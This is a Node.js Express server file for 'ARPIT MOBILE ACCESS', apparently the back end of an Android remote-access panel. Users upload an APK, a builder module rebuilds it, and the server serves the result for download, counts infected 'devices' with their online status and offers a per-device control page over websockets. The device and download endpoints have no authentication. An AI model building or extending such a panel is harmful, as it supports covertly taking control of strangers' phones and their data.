require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const cookieParser = require('cookie-parser');
const { nanoid } = require('nanoid');

const db = require('./db');
const auth = require('./auth');
const hub = require('./hub');
const builder = require('./builder');

const app = express();
const server = http.createServer(app);
const up = multer({ dest: '/tmp/arpit-up', limits: { fileSize: 300 * 1024 * 1024 } });

app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, '..', 'public')));

/* ---------- auth ---------- */
app.post('/api/register', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'email+password' });
  if (db.prepare('SELECT 1 FROM users WHERE email=?').get(email)) return res.status(409).json({ error: 'exists' });
  const r = db.prepare('INSERT INTO users (email,hash,created) VALUES (?,?,?)')
    .run(email, auth.hash(password), Date.now());
  res.cookie('t', auth.sign(r.lastInsertRowid), { httpOnly: true, sameSite: 'lax' });
  res.json({ ok: true });
});

app.post('/api/login', (req, res) => {
  const u = db.prepare('SELECT * FROM users WHERE email=?').get(req.body.email || '');
  if (!u || !auth.verify(req.body.password || '', u.hash)) return res.status(401).json({ error: 'bad login' });
  res.cookie('t', auth.sign(u.id), { httpOnly: true, sameSite: 'lax' });
  res.json({ ok: true });
});

app.post('/api/logout', (req, res) => { res.clearCookie('t'); res.json({ ok: true }); });

/* ---------- builds ---------- */
app.get('/api/builds', auth.guard, (req, res) => {
  const rows = db.prepare(`
    SELECT b.*, (SELECT COUNT(*) FROM devices d WHERE d.build_id=b.id) AS devices,
           (SELECT COUNT(*) FROM devices d WHERE d.build_id=b.id AND d.online=1) AS online
    FROM builds b ORDER BY b.created DESC`).all();
  res.json(rows.map(({ secret, ...r }) => r));
});

app.post('/api/builds', auth.guard, up.single('apk'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'apk required' });
  const name = (req.body.name || '').trim() || 'build-' + Date.now();
  const id = nanoid(8);
  db.prepare('INSERT INTO builds (id,name,orig,status,secret,created) VALUES (?,?,?,?,?,?)')
    .run(id, name, req.file.originalname, 'building', nanoid(24), Date.now());
  res.json({ id });
  builder.build({ buildId: id, inputApk: req.file.path, name });
});

app.get('/api/builds/:id', auth.guard, (req, res) => {
  const b = db.prepare('SELECT * FROM builds WHERE id=?').get(req.params.id);
  if (!b) return res.status(404).json({ error: 'nf' });
  res.json(b);
});

app.delete('/api/builds/:id', auth.guard, (req, res) => {
  db.prepare('DELETE FROM builds WHERE id=?').run(req.params.id);
  db.prepare('DELETE FROM devices WHERE build_id=?').run(req.params.id);
  fs.rm(path.join(__dirname, '..', 'apks', `${req.params.id}.apk`), { force: true }, () => {});
  res.json({ ok: true });
});

app.get('/apks/:id.apk', (req, res) => {
  const f = path.join(__dirname, '..', 'apks', `${req.params.id}.apk`);
  if (!fs.existsSync(f)) return res.status(404).end();
  res.download(f, `${req.params.id}.apk`);
});

/* ---------- devices ---------- */
app.get('/api/devices/:buildId', (req, res) => {
  res.json(db.prepare('SELECT * FROM devices WHERE build_id=? ORDER BY online DESC, last DESC').all(req.params.buildId));
});

app.get('/api/device/:id', (req, res) => {
  const d = db.prepare('SELECT * FROM devices WHERE id=?').get(req.params.id);
  if (!d) return res.status(404).json({ error: 'nf' });
  res.json(d);
});

/* ---------- pages ---------- */
app.get('/p/:id', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'panel.html')));
app.get('/p/:id/d/:dev', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'control.html')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'index.html')));

/* ---------- ws ---------- */
hub.attach(server);

server.listen(process.env.PORT || 3000, () => console.log('ARPIT MOBILE ACCESS up'));
